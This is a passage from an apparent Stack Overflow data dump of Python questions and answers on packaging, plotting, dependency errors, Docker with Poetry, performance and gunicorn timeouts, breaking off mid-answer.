07:53:53     included in the distribution as &quot;data&quot;.
07:53:53     This behavior is likely to change in future versions of setuptools (and
07:53:53     therefore is considered deprecated).
07:53:53 
07:53:53     Please make sure that 'mypackage.plugins' is included as a package by using
07:53:53     setuptools' `packages` configuration field or the proper discovery methods
07:53:53     (for example by using `find_namespace_packages(...)`/`find_namespace:`
07:53:53     instead of `find_packages(...)`/`find:`).
07:53:53 
07:53:53     You can read more about &quot;package discovery&quot; and &quot;data files&quot; on setuptools
07:53:53     documentation page.
</code></pre>
<p>I get the above warning for pretty much every directory within mypackage that contains data and is included by MANIFEST.in.</p>
<p>My goal is to include arbitrary data (which could even include python files in the case of a plugin interface) in a package so that it can be accessed by users who install via wheel or tarball. I would also like that applications built by, e.g., pyinstaller, that pull my package in can easily collect the data with <code>collect_data_files</code>, which for me has worked without any additional setup with the current methodology.</p>
<p>What is the proper way to do this going forward?</p>
","72660189","<p>The TL;DR is that in Python since <a href=""https://peps.python.org/pep-0420/"" rel=""noreferrer"">PEP 420</a>, directories count as packages, even if they don't have a <code>__init__.py</code> file.</p>
<p>The main difference is that directories without <code>__init__.py</code> are called &quot;namespace packages&quot;.</p>
<p>Accordingly, if a project wants to distribute directories without a <code>__init__.py</code> file, it should use <code>packages=find_namespace_packages()</code> (setup.py) or <code>packages = find_namespace:</code> (setup.cfg). Details on how to use those tools can be found on <a href=""https://setuptools.pypa.io/en/latest/userguide/package_discovery.html#custom-discovery"" rel=""noreferrer"">these docs</a>. Doing this change should make the error go away.</p>
<p>The <code>MANIFEST.in</code> or the <code>include_package_data=True</code> should be fine.</p>
"
"72034176","1","adjust the size of the text label in plotly","<p>Im trying to adjust the text size accoridng to country size, so the text will be inside the boardes of the copuntry.</p>
<pre><code>import pandas as pd
import plotly.express as px

df=pd.read_csv('regional-be-daily-latest.csv', header = 1)

fig = px.choropleth(df, locations='Code', color='Track Name')
fig.update_layout(margin={&quot;r&quot;:0,&quot;t&quot;:0,&quot;l&quot;:0,&quot;b&quot;:0})

fig.add_scattergeo(

  locations = df['Code'],
  text = df['Track Name'],
  mode = 'text',
)

fig.show()
</code></pre>
<p>For the visualiztion:</p>
<p><a href=""https://i.stack.imgur.com/7ydEM.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/7ydEM.png"" alt=""enter image description here"" /></a></p>
<p>The text for orange country is inside the boardes of the country but the text to label the blue countrry is bigger.</p>
<p>Best would be to adjust the size so it will not exceed the boardes of the country</p>
","72034697","<p>You can set the font size using the update_layout function and specifying the font's size by passing the dictionary in the font parameter.</p>
<pre><code>import pandas as pd
import plotly.express as px

df=pd.read_csv('regional-be-daily-latest.csv', header = 1)

fig = px.choropleth(df, locations='Code', color='Track Name')
fig.update_layout(margin={&quot;r&quot;:0,&quot;t&quot;:0,&quot;l&quot;:0,&quot;b&quot;:0})

fig.add_scattergeo(

  locations = df['Code'],
  text = df['Track Name'],
  mode = 'text',
)


fig.update_layout(
    font=dict(
        family=&quot;Courier New, monospace&quot;,
        size=18,  # Set the font size here
        color=&quot;RebeccaPurple&quot;
    )
)

fig.show()
</code></pre>
"
"72411825","1","Jupyter notebook in vscode with virtual environment fails to import tensorflow","<p>I'm attempting to create an isolated virtual environment running tensorflow &amp; tf2onnx using a jupyter notebook in vscode.</p>
<p>The tf2onnx packge recommends python 3.7, and my local 3.7.9 version usually works well with tensorflow projects, so I have local and global versions set to 3.7.9 using pyenv.</p>
<p>The following is my setup procedure:</p>
<p><code>python -m venv .venv</code></p>
<p>Then after starting a new terminal in vscode:</p>
<p><code>pip install tensorflow==2.7.0</code></p>
<p><code>pip freeze &gt; requirements.txt</code></p>
<p>After this, in a cell in my jupyter notebook, the following line fails</p>
<pre><code>import tensorflow.keras as keras
</code></pre>
<p>Exception:</p>
<blockquote>
<pre><code>TypeError: Descriptors cannot not be created directly.
If this call came from a _pb2.py file, your generated code is out of date and must be 
regenerated with protoc &gt;= 3.19.0.
If you cannot immediately regenerate your protos, some other possible workarounds are:
1. Downgrade the protobuf package to 3.20.x or lower.
2. Set PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python (but this will use pure-Python 
parsing and will be much slower).
</code></pre>
</blockquote>
<p>At this point, the <code>protobuf</code> package version is showing as v4.21.0 in my requirements file.  I've attempted to pre-install the 3.20.1 version into the virtual environment before installing tensorflow but this yields no effect.</p>
<p>Here is the full requirements file after installing tensorflow:</p>
<pre><code>absl-py==1.0.0
astunparse==1.6.3
cachetools==5.1.0
certifi==2022.5.18.1
charset-normalizer==2.0.12
flatbuffers==2.0
gast==0.4.0
google-auth==2.6.6
google-auth-oauthlib==0.4.6
google-pasta==0.2.0
grpcio==1.46.3
h5py==3.7.0
idna==3.3
importlib-metadata==4.11.4
keras==2.7.0
Keras-Preprocessing==1.1.2
libclang==14.0.1
Markdown==3.3.7
numpy==1.21.6
oauthlib==3.2.0
opt-einsum==3.3.0
protobuf==4.21.0
pyasn1==0.4.8
pyasn1-modules==0.2.8
requests==2.27.1
requests-oauthlib==1.3.1
rsa==4.8
six==1.16.0
tensorboard==2.9.0
tensorboard-data-server==0.6.1
tensorboard-plugin-wit==1.8.1
tensorflow==2.7.0
tensorflow-estimator==2.7.0
tensorflow-io-gcs-filesystem==0.26.0
termcolor==1.1.0
typing-extensions==4.2.0
urllib3==1.26.9
Werkzeug==2.1.2
wrapt==1.14.1
zipp==3.8.0
</code></pre>
","72414640","<p>A recent <a href=""https://developers.google.com/protocol-buffers/docs/news/2022-05-06#python-updates"" rel=""noreferrer"">change in protobuf</a> is causing <a href=""https://github.com/tensorflow/tensorflow/issues/56077"" rel=""noreferrer"">TensorFlow to break</a>. Downgrading before installing TensorFlow might not work because TensorFlow might be bumping up the version itself. Check if that is what happens during the installation.</p>
<p>You might want to either:</p>
<p>Downgrade with</p>
<pre><code>pip install --upgrade &quot;protobuf&lt;=3.20.1&quot;
</code></pre>
<p>after installing TensorFlow, or</p>
<p>Upgrade TensorFlow to the latest version, as TensorFlow has updated their setup file in their 2.9.1 release.</p>
"
"72593814","1","Cannot import name 'soft_unicode' from 'markupsafe' in google colab","<p>I'm trying to install pycaret==3.0.0 in google colab, But I'm having a problem, the library requires Jinja2 to be installed which I did, but then It finally throws off another error.</p>
<pre><code>ImportError                               Traceback (most recent call last)
&lt;ipython-input-26-4f8843d24b3a&gt; in &lt;module&gt;()
----&gt; 1 import jinja2
      2 from pycaret.regression import *

3 frames
/usr/local/lib/python3.7/dist-packages/jinja2/filters.py in &lt;module&gt;()
     11 from markupsafe import escape
     12 from markupsafe import Markup
---&gt; 13 from markupsafe import soft_unicode
     14 
     15 from ._compat import abc

ImportError: cannot import name 'soft_unicode' from 'markupsafe' (/root/.local/lib/python3.7/site-packages/markupsafe/__init__.py)
</code></pre>
","72834195","<p>This is caused by <a href=""https://github.com/aws/aws-sam-cli/issues/3661"" rel=""noreferrer"">upgrade</a> in MarkupSafe:2.1.0 where they have removed soft_unicode, try using:</p>
<pre><code>pip install markupsafe==2.0.1
</code></pre>
"
"72452403","1","Cross-reference between numpy arrays","<p>I have a 1d array of ids, for example:</p>
<pre><code>a = [1, 3, 4, 7, 9]
</code></pre>
<p>Then another 2d array:</p>
<pre><code>b = [[1, 4, 7, 9], [3, 7, 9, 1]]
</code></pre>
<p>I would like to have a third array with the same shape of b where each item is the index of the corresponding item from a, that is:</p>
<pre><code>c = [[0, 2, 3, 4], [1, 3, 4, 0]]
</code></pre>
<p>What's a vectorized way to do that using numpy?</p>
","72453076","<p>Effectively, this solution is a one-liner. The only catch is that you need to reshape the array before you do the one-liner, and then reshape it back again:</p>
<pre><code>import numpy as np

a = np.array([1, 3, 4, 7, 9])
b = np.array([[1, 4, 7, 9], [3, 7, 9, 1]])
original_shape = b.shape

c = np.where(b.reshape(b.size, 1) == a)[1]

c = c.reshape(original_shape)
</code></pre>
<p>This results with:</p>
<pre><code>[[0 2 3 4]
 [1 3 4 0]]
</code></pre>
"
"72059380","1","Python fuctional style iterative algoritm?","<p>In Haskell there is a simple list function available</p>
<pre><code>iterate :: (a -&gt; a) -&gt; a -&gt; [a]
iterate f x =  x : iterate f (f x)
</code></pre>
<p>In python it could be implemented as following:</p>
<pre><code>def iterate(f, init):
  while True:
    yield init
    init = f(init)
</code></pre>
<p>I was kinda surprised that something basic like this is not part of the functools/itertools modules. Could it be simply costructed in functional style (i.e. without the loop) using the tools provided in these libraries? (Mostly code golf, trying to learn about functional style in Python.)</p>
","72059725","<p>You can do it using some of the functions in <code>itertools</code>:</p>
<pre class=""lang-py prettyprint-override""><code>from itertools import accumulate, repeat

def iterate(func, initial):
    return accumulate(repeat(None), func=lambda tot, _: func(tot), initial=initial)
</code></pre>
<p>Although it's clearly not very clean. Itertools is missing some fundamental functions for constructing streams, like <code>unfoldr</code>. Most of the <code>itertools</code> functions could be defined in terms of <code>unfoldr</code>, as it happens, but functional programming is a little uncomfortable in Python anyways so that might not be much of a benefit.</p>
"
"72465421","1","How to use poetry with docker?","<p>How do I install poetry in my image? (should I use <code>pip</code>?)</p>
<p>Which version of poetry should I use?</p>
<p>Do I need a virtual environment?</p>
<p>There are <a href=""https://stackoverflow.com/questions/53835198/integrating-python-poetry-with-docker"">many</a> <a href=""https://github.com/wemake-services/wemake-django-template/blob/8719ccee322436b6af56835bb6e3eb07ce992718/%7B%7Bcookiecutter.project_name%7D%7D/docker/django/Dockerfile"" rel=""noreferrer"">examples</a> and <a href=""https://github.com/python-poetry/poetry/issues/1178#issuecomment-517812277"" rel=""noreferrer"">opinions</a> in <a href=""https://github.com/python-poetry/poetry/discussions/1879#discussioncomment-216870"" rel=""noreferrer"">the</a> <a href=""https://pythonspeed.com/articles/poetry-vs-docker-caching/"" rel=""noreferrer"">wild</a> which offer different solutions.</p>
","72465422","<h1>TL;DR</h1>
<p>Install poetry with pip, configure virtualenv, install dependencies, run your app.</p>
<pre><code>FROM python:3.10

# Configure Poetry
ENV POETRY_VERSION=1.2.0
ENV POETRY_HOME=/opt/poetry
ENV POETRY_VENV=/opt/poetry-venv
ENV POETRY_CACHE_DIR=/opt/.cache

# Install poetry separated from system interpreter
RUN python3 -m venv $POETRY_VENV \
    &amp;&amp; $POETRY_VENV/bin/pip install -U pip setuptools \
    &amp;&amp; $POETRY_VENV/bin/pip install poetry==${POETRY_VERSION}

# Add `poetry` to PATH
ENV PATH=&quot;${PATH}:${POETRY_VENV}/bin&quot;

WORKDIR /app

# Install dependencies
COPY poetry.lock pyproject.toml ./
RUN poetry install

# Run your app
COPY . /app
CMD [ &quot;poetry&quot;, &quot;run&quot;, &quot;python&quot;, &quot;-c&quot;, &quot;print('Hello, World!')&quot; ]
</code></pre>
<h1>In Detail</h1>
<h2>Installing Poetry</h2>
<blockquote>
<p>How do I install poetry in my image? (should I use <code>pip</code>?)</p>
</blockquote>
<h3>Install it with <code>pip</code></h3>
<p>You should install poetry with pip. but you need to isolate it from the system interpreter and the project's virtual environment.</p>
<blockquote>
<p>For maximum control in your CI environment, installation with pip is fully supported ... offers the best debugging experience, and leaves you subject to the fewest external tools.</p>
</blockquote>
<pre><code>ENV POETRY_VERSION=1.2.0
ENV POETRY_VENV=/opt/poetry-venv

# Install poetry separated from system interpreter
RUN python3 -m venv $POETRY_VENV \
    &amp;&amp; $POETRY_VENV/bin/pip install -U pip setuptools \
    &amp;&amp; $POETRY_VENV/bin/pip install poetry==${POETRY_VERSION}

# Add `poetry` to PATH
ENV PATH=&quot;${PATH}:${POETRY_VENV}/bin&quot;
</code></pre>
<h2>Poetry Version</h2>
<blockquote>
<p>Which version of poetry should I use?</p>
</blockquote>
<p>Specify the latest stable version explicitly in your installation.</p>
<p>Forgetting to specify <code>POETRY_VERSION</code> will result in <em>undeterministic builds</em>, as the installer will always install the latest version - which may introduce breaking changes</p>
<h2>Virtual Environment (virtualenv)</h2>
<blockquote>
<p>Do I need a virtual environment?</p>
</blockquote>
<p>Yes, and you need to configure it a bit.</p>
<pre><code>ENV POETRY_CACHE_DIR=/opt/.cache
</code></pre>
<p>The reasons for this are somewhat off topic:</p>
<blockquote class=""spoiler"">
<p> By default, poetry creates a virtual environment in $HOME/.cache/pypoetry/virtualenvs to isolate the system interpreter from your application. This is the desired behavior for most development scenarios. When using a container, the $HOME variable may be changed by <a href=""https://cloud.google.com/run/docs/issues#home"" rel=""noreferrer"" title=""HOME Variable Issue"">certain runtimes</a>, so creating the virtual environment in an independent directory solves any reproducibility issues that may arise.</p>
</blockquote>
<h2>Bringing It All Together</h2>
<p>To use poetry in a docker image you need to:</p>
<ol>
<li><a href=""https://python-poetry.org/docs/master/#installation"" rel=""noreferrer"" title=""Installing Poetry"">Install</a> your desired version of poetry</li>
<li><a href=""https://python-poetry.org/docs/configuration/#virtualenvsin-project"" rel=""noreferrer"" title=""Config Virtualenv"">Configure</a> virtual environment location</li>
<li><a href=""https://python-poetry.org/docs/master/cli/#install"" rel=""noreferrer"" title=""poetry install"">Install</a> your dependencies</li>
<li>Use <code>poetry run python ...</code> to run your application</li>
</ol>
<h2>A Working Example:</h2>
<p>This is a minimal flask project managed with poetry.</p>
<p>You can copy these contents to your machine to test it out (expect for <code>poerty.lock</code>)</p>
<h3>Project structure</h3>
<pre><code>python-poetry-docker/
|- Dockerfile
|- app.py
|- pyproject.toml
|- poetry.lock
</code></pre>
<h4><code>Dockerfile</code></h4>
<pre><code>FROM python:3.10 as python-base

# https://python-poetry.org/docs#ci-recommendations
ENV POETRY_VERSION=1.2.0
ENV POETRY_HOME=/opt/poetry
ENV POETRY_VENV=/opt/poetry-venv

# Tell Poetry where to place its cache and virtual environment
ENV POETRY_CACHE_DIR=/opt/.cache

# Create stage for Poetry installation
FROM python-base as poetry-base

# Creating a virtual environment just for poetry and install it with pip
RUN python3 -m venv $POETRY_VENV \
    &amp;&amp; $POETRY_VENV/bin/pip install -U pip setuptools \
    &amp;&amp; $POETRY_VENV/bin/pip install poetry==${POETRY_VERSION}

# Create a new stage from the base python image
FROM python-base as example-app

# Copy Poetry to app image
COPY --from=poetry-base ${POETRY_VENV} ${POETRY_VENV}

# Add Poetry to PATH
ENV PATH=&quot;${PATH}:${POETRY_VENV}/bin&quot;

WORKDIR /app

# Copy Dependencies
COPY poetry.lock pyproject.toml ./

# [OPTIONAL] Validate the project is properly configured
RUN poetry check

# Install Dependencies
RUN poetry install --no-interaction --no-cache --without dev

# Copy Application
COPY . /app

# Run Application
EXPOSE 5000
CMD [ &quot;poetry&quot;, &quot;run&quot;, &quot;python&quot;, &quot;-m&quot;, &quot;flask&quot;, &quot;run&quot;, &quot;--host=0.0.0.0&quot; ]
</code></pre>
<h4><code>app.py</code></h4>
<pre class=""lang-py prettyprint-override""><code>from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello, Docker!'
</code></pre>
<h4><code>pyproject.toml</code></h4>
<pre class=""lang-ini prettyprint-override""><code>[tool.poetry]
name = &quot;python-poetry-docker-example&quot;
version = &quot;0.1.0&quot;
description = &quot;&quot;
authors = [&quot;Someone &lt;someone@example.com&gt;&quot;]

[tool.poetry.dependencies]
python = &quot;^3.10&quot;
Flask = &quot;^2.1.2&quot;

[tool.poetry.dev-dependencies]

[build-system]
requires = [&quot;poetry-core&gt;=1.0.0&quot;]
build-backend = &quot;poetry.core.masonry.api&quot;
</code></pre>
<h4><code>poetry.lock</code></h4>
<pre class=""lang-ini prettyprint-override""><code>[[package]]
name = &quot;click&quot;
version = &quot;8.1.3&quot;
description = &quot;Composable command line interface toolkit&quot;
category = &quot;main&quot;
optional = false
python-versions = &quot;&gt;=3.7&quot;

[package.dependencies]
... more lines ommitted
</code></pre>
<p>Full contents in <a href=""https://gist.github.com/soof-golan/6ebb97a792ccd87816c0bda1e6e8b8c2"" rel=""noreferrer"">gist</a>.</p>
"
"72920577","1","(mach-o file, but is an incompatible architecture (have 'arm64', need 'x86_64'))","<p>I have a problem when I run a .py file on a Macbook Air M1:</p>
<pre><code>[Running] python3 -u &quot;/Users/kaiyuwei/Documents/graduation project/metaheuristics/run_CRO.py&quot;
Traceback (most recent call last):
  File &quot;/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/__init__.py&quot;, line 23, in &lt;module&gt;
    from . import multiarray
  File &quot;/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/multiarray.py&quot;, line 10, in &lt;module&gt;
    from . import overrides
  File &quot;/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/overrides.py&quot;, line 6, in &lt;module&gt;
    from numpy.core._multiarray_umath import (
ImportError: dlopen(/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/_multiarray_umath.cpython-38-darwin.so, 0x0002): tried: '/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/_multiarray_umath.cpython-38-darwin.so' (mach-o file, but is an incompatible architecture (have 'arm64', need 'x86_64'))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File &quot;/Users/kaiyuwei/Documents/graduation project/metaheuristics/run_CRO.py&quot;, line 1, in &lt;module&gt;
    from models.multiple_solution.evolutionary_based.CRO import BaseCRO
  File &quot;/Users/kaiyuwei/Documents/graduation project/metaheuristics/models/multiple_solution/evolutionary_based/CRO.py&quot;, line 1, in &lt;module&gt;
    import numpy as np
  File &quot;/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/__init__.py&quot;, line 140, in &lt;module&gt;
    from . import core
  File &quot;/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/__init__.py&quot;, line 49, in &lt;module&gt;
    raise ImportError(msg)
ImportError: 

IMPORTANT: PLEASE READ THIS FOR ADVICE ON HOW TO SOLVE THIS ISSUE!

Importing the numpy C-extensions failed. This error can happen for
many reasons, often due to issues with your setup or how NumPy was
installed.

We have compiled some common reasons and troubleshooting tips at:

    https://numpy.org/devdocs/user/troubleshooting-importerror.html

Please note and check the following:

  * The Python version is: Python3.8 from &quot;/Library/Developer/CommandLineTools/usr/bin/python3&quot;
  * The NumPy version is: &quot;1.23.1&quot;

and make sure that they are the versions you expect.
Please carefully study the documentation linked above for further help.

Original error was: dlopen(/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/_multiarray_umath.cpython-38-darwin.so, 0x0002): tried: '/Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages/numpy/core/_multiarray_umath.cpython-38-darwin.so' (mach-o file, but is an incompatible architecture (have 'arm64', need 'x86_64'))


[Done] exited with code=1 in 0.055 seconds
</code></pre>
<p>I think the reason is that I'm using the <code>numpy</code> package for 'x86_64', so I tried to use <code>pip install numpy --upgrade</code> to upgrade numpy, but I got output like:</p>
<pre><code>Requirement already satisfied: numpy in /Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages (1.23.1)
</code></pre>
<p>I also tried <code>python3 -m pip install --upgrade pip</code> to upgrade python, but still;</p>
<pre><code>Requirement already satisfied: pip in /Users/kaiyuwei/Library/Python/3.8/lib/python/site-packages (22.1.2)
</code></pre>
<p>Can anyone help me?</p>
","72920835","<p>I solved the problem by simply uninstalling numpy package:</p>
<pre><code>pip3 uninstall numpy
</code></pre>
<p>and reinstalling it:</p>
<pre><code>pip3 install numpy
</code></pre>
"
"72118249","1","Why is branchless programming and built-ins slower?","<p>I found 2 branchless functions that find the maximum of two numbers in python, and compared them to an if statement and the built-in max function. I thought the branchless or the built-in functions would be the fastest, but the fastest was the if-statement function by a large margin. Does anybody know why this is? Here are the functions:</p>
<p>If-statement (2.16 seconds for 25000 operations):</p>
<pre><code>def max1(a, b):
    if a &gt; b:
        return a
    return b
</code></pre>
<p>Built-in (4.69 seconds for 25000 operations):</p>
<pre><code>def max2(a, b):
    return max(a, b)
</code></pre>
<p>Branchless 1 (4.12 seconds for 25000 operations):</p>
<pre><code>def max3(a, b):
    return (a &gt; b) * a + (a &lt;= b) * b
</code></pre>
<p>Branchless 2 (5.34 seconds for 25000 operations):</p>
<pre><code>def max4(a, b):
    diff = a - b
    return a - (diff &amp; diff &gt;&gt; 31)
</code></pre>
","72118450","<p>Your expectations about branching vs. branchless code apply to low-level languages like assembly and C. Branchless code can be faster in low-level languages because it prevents slowdowns caused by branch prediction misses. (Note: this means branchless code <em>can</em> be faster, but it will not necessarily be.)</p>
<p>Python is a high-level language. Assuming you are using the CPython interpreter: for every bytecode instruction you execute, the interpreter has to branch on the kind of opcode, and typically many other things. For example, even the simple <code>&lt;</code> operator requires a branch to check for the <code>&lt;</code> opcode, another branch to check whether the object's class implements a <code>__lt__</code> method, more branches to check whether the right-hand-side value is of a valid type for the comparison to be performed, and probably several other branches. Even your so-called &quot;branchless&quot; code will in practice result in a lot of branching for these reasons.</p>
<p>Because Python is so high-level, each bytecode instruction is actually doing quite a lot of work compared to a single machine-code instruction. So the performance of simple code like this will mainly depend on how many bytecode instructions have to be interpreted:</p>
<ul>
<li>Your <code>max1</code> function has to do three loads of local variables, a comparison, a conditional jump and a return. That's six.</li>
<li>Your <code>max2</code> function does two loads of local variables, one load of a global variable (referencing the built-in <code>max</code>), and also makes a function call; that requires passing arguments, and is relatively expensive compared to other bytecode instructions. On top of that, the built-in function itself has to do the same work as your own <code>max1</code> function, so no wonder <code>max2</code> is slower.</li>
<li>Your <code>max3</code> function does six loads of local variables, two comparisons, two multiplications, one addition, and one return. That's twelve instructions, so we should expect it to take about twice as long as <code>max1</code>.</li>
<li>Likewise <code>max4</code> does five loads of local variables, one store to a local variable, one load of a constant, two subtractions, one bitshift, one bitwise &quot;and&quot;, and one return. That's twelve instructions again.</li>
</ul>
<p>That said, note that if we compare your <code>max1</code> with the built-in function <code>max</code> directly, instead of your <code>max2</code> which has an extra function call, your <code>max1</code> function is still <em>a bit faster</em> than the built-in <code>max</code>. This is probably because the built-in <code>max</code> accepts a variable number of arguments, which may involve building a tuple of arguments, and the built-in <code>max</code> function also has a branch to check if it was called with a single iterable argument (e.g. <code>max([3, 1, 4, 2])</code>), and handle that case differently; your <code>max1</code> function doesn't do those things.</p>
"
"72155476","1","Is this ""greedy"" += behavior of lists guaranteed?","<p>I occasionally use the &quot;trick&quot; to extend a list by a mapped version of itself, for example to efficiently compute powers of 2:</p>
<pre><code>from operator import mul

powers = [1]
powers += map(mul, [2] * 10, powers)

print(powers)   # prints [1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024]
</code></pre>
<p>This relies on the <code>+=</code> immediately appending each value from <code>map</code> to the list, so that the <code>map</code> then finds it and the procedure continues. In other words, it needs to work like this:</p>
<pre><code>powers = [1]
for value in map(mul, [2] * 10, powers):
    powers.append(value)
</code></pre>
<p>And not first compute and store the whole right-hand side like this, where <code>powers</code> ends up being <code>[1, 2]</code>:</p>
<pre><code>powers = [1]
powers += list(map(mul, [2] * 10, powers))
</code></pre>
<p>Is it somewhere guaranteed that it works like it does? I checked the <a href=""https://docs.python.org/3/library/stdtypes.html#mutable-sequence-types"" rel=""noreferrer"">Mutable Sequence Types</a> documentation but it doesn't say much about it other than implying equivalence of <code>s += t</code> and <code>s.extend(t)</code>. It does refer to <a href=""https://docs.python.org/3/library/collections.abc.html#collections.abc.MutableSequence"" rel=""noreferrer""><code>MutableSequence</code></a>, whose <a href=""https://github.com/python/cpython/blob/4674b315e555828e5cb15bedcf2c495669670cbb/Lib/_collections_abc.py#L1139-L1162"" rel=""noreferrer"">source code</a> includes this:</p>
<pre><code>    def extend(self, values):
        'S.extend(iterable) -- extend sequence by appending elements from the iterable'
        if values is self:
            values = list(values)
        for v in values:
            self.append(v)
</code></pre>
<pre><code>    def __iadd__(self, values):
        self.extend(values)
        return self
</code></pre>
<p>This does suggest that it's indeed <em>supposed</em> to work like it does and like I want it, but some source code being what it is doesn't feel as safe as a guarantee in the documentation.</p>
","72155954","<p>I don't see any tests or docs that the greedy behavior is guaranteed; however, I do think it is the expected behavior and that code in the wild relies on it.</p>
<p>FWIW, <code>+=</code> with lists is equivalent to <code>list.extend()</code>, so your &quot;trick&quot; boils down to:</p>
<pre><code>&gt;&gt;&gt; powers = [1]
&gt;&gt;&gt; powers.extend(2*x for x in islice(powers, 10))
&gt;&gt;&gt; powers
[1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024]
</code></pre>
<p>While I haven't found a guarantee for <code>+=</code> or <code>extend</code>, we do have a guarantee that the list iterator allows mutation while iterating.¹  So, this code is on firm ground:</p>
<pre><code>&gt;&gt;&gt; powers = [1]
&gt;&gt;&gt; for x in powers:
        if len(powers) == 10:
            break
        powers.append(2 * x)

&gt;&gt;&gt; powers
[1, 2, 4, 8, 16, 32, 64, 128, 256, 512]
</code></pre>
<p>¹ See the second paragraph following the table at:
<a href=""https://docs.python.org/3/library/stdtypes.html#common-sequence-operations"" rel=""noreferrer"">https://docs.python.org/3/library/stdtypes.html#common-sequence-operations</a>:</p>
<blockquote>
<p>Forward and reversed iterators over mutable sequences access values
using an index. That index will continue to march forward (or
backward) even if the underlying sequence is mutated. The iterator
terminates only when an IndexError or a StopIteration is encountered
(or when the index drops below zero).</p>
</blockquote>
"
"72166020","1","how to install multiple packages in one line using conda?","<p>I need to install below multiple packages using conda. I am not sure what is conda-forge? some uses conda-forge, some doesn't use it. Is it possible to install them in one line without installing them one by one?  Thanks</p>
<pre><code>conda install -c conda-forge dash-daq
conda install -c conda-forge dash-core-components
conda install -c conda-forge dash-html-components
conda install -c conda-forge dash-bootstrap-components
conda install -c conda-forge dash-table
conda install -c plotly jupyter-dash

</code></pre>
","72166052","<h2>Why some packages have to be installed through conda forge:</h2>
<p>Conda official repository only feature a few verified packages. A vast portion of python packages that are otherwise available through pip are installed through <strong>community</strong> led channel called <em>conda-forge</em>. You can visit their <a href=""https://conda-forge.org/"" rel=""nofollow noreferrer"">site</a> to learn more about it.</p>
<h2>How to install multiple packages in a single line?</h2>
<p>The recommended way to install multiple packages is to create a <code>.yml</code> file and feed conda this. You can specify the version number for each package as well.</p>
<p>The following example file can be fed to conda through <code>conda install --file</code>:</p>
<pre><code>appdirs=1.4.3
asn1crypto=0.24.0
...
zope=1.0
zope.interface=4.5.0
</code></pre>
<p>To specify different channel for each package in this <code>environment.yml</code> file, you can use the <code>::</code> syntax.</p>
<pre><code>dependencies:
  - python=3.6
  - bagit
  - conda-forge::beautifulsoup4
</code></pre>
"
"72907474","1","Gunicorn with gevent does not enforce timeout","<p>Let's say I have a simple flask app:</p>
<pre><code>import time
from flask import Flask

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    for i in range(10):
        print(f&quot;Slept for {i + 1}/{seconds} seconds&quot;)
        time.sleep(1)
    return &quot;Hello world&quot;
</code></pre>
<p>I can run it with gunicorn with a 5 second timeout:</p>
<pre><code>gunicorn app:app -b 127.0.0.1:5000 -t 5
</code></pre>
<p>As expected, <a href=""http://127.0.0.1:5000"" rel=""nofollow noreferrer"">http://127.0.0.1:5000</a> times out after 5 seconds:</p>
<pre><code>Slept for 1/10 seconds
Slept for 2/10 seconds
Slept for 3/10 seconds
Slept for 4/10 seconds
Slept for 5/10 seconds
[2022-07-07 22:45:01 -0700] [57177] [CRITICAL] WORKER TIMEOUT (pid:57196)
</code></pre>
<p>Now, I want to run gunicorn with an async worker to allow the web server to use its available resources more efficiently, maximizing time that otherwise would be spent idling to do additional work instead. I'm using gevent, still with a timeout of 5 seconds.</p>
<pre><code>gunicorn app:app -b 127.0.0.1:5000 -t 5 -k gevent
</code></pre>
<p>Unexpectedly, <a href=""http://127.0.0.1:5000"" rel=""nofollow noreferrer"">http://127.0.0.1:5000</a> does NOT time out:</p>
<pre><code>Slept for 1/10 seconds
Slept for 2/10 seconds
Slept for 3/10 seconds
Slept for 4/10 seconds
Slept for 5/10 seconds
Slept for 6/10 seconds
Slept for 7/10 seconds
Slept for 8/10 seconds
Slept for 9/10 seconds
Slept for 10/10 seconds
</code></pre>
<p>Looks like this is a known issue with gunicorn. The timeout only applies to the default sync worker, not async workers: <a href=""https://github.com/benoitc/gunicorn/issues/2695"" rel=""nofollow noreferrer"">https://github.com/benoitc/gunicorn/issues/2695</a></p>
<hr />
<p>uWSGI is an alternate option to gunicorn. I'm not as familiar with it. Looks like its timeout option is called <code>harakiri</code> and it can be run with gevent:</p>
<pre><code>uwsgi --http 127.0.0.1:5000 --harakiri 5 --master -w app:app --gevent 100
</code></pre>
<p>uWSGI's timeout sometimes works as expected with gevent:</p>
<pre><code>Slept for 1/10 seconds
Slept for 2/10 seconds
Slept for 3/10 seconds
Slept for 4/10 seconds
Slept for 5/10 seconds
Thu Jul  7 23:20:59 2022 - *** HARAKIRI ON WORKER 1 (pid: 59836, try: 1) ***
Thu Jul  7 23:20:59 2022 - HARAKIRI !!! worker 1 status !!!
Thu Jul  7 23:20:59 2022 - HARAKIRI [core 99] 127.0.0.1 - GET / since 1657261253
Thu Jul  7 23:20:59 2022 - HARAKIRI !!! end of worker 1 status !!!
DAMN ! worker 1 (pid: 59836) died, killed by signal 9 :( trying respawn ...
</code></pre>
<p>But other times it doesn't time out so it appears to be pretty flaky.</p>
<hr />
<p>Is there anyway to enforce a timeout using gunicorn with an async worker? If not, are there any other web servers that enforce a consistent timeout with an async worker, similar to uWSGI?</p>
","72938801","<p>From <a href=""https://docs.gunicorn.org/en/stable/settings.html#timeout"" rel=""noreferrer"">https://docs.gunicorn.org/en/stable/settings.html#timeout</a>:</p>
<blockquote>
<p>Workers silent for more than this many seconds are killed and restarted.</p>
</blockquote>
<blockquote>
<p>For the non sync workers it just means that the worker process is still communicating and is not tied to the length of time required to handle a single request.</p>
</blockquote>
<p>So <code>timeout</code> is likely functioning by design — as worker timeout, not request timeout.</p>
<p>You can subclass <code>GeventWorker</code> to override <code>handle_request()</code> with <code>gevent.Timeout</code>:</p>
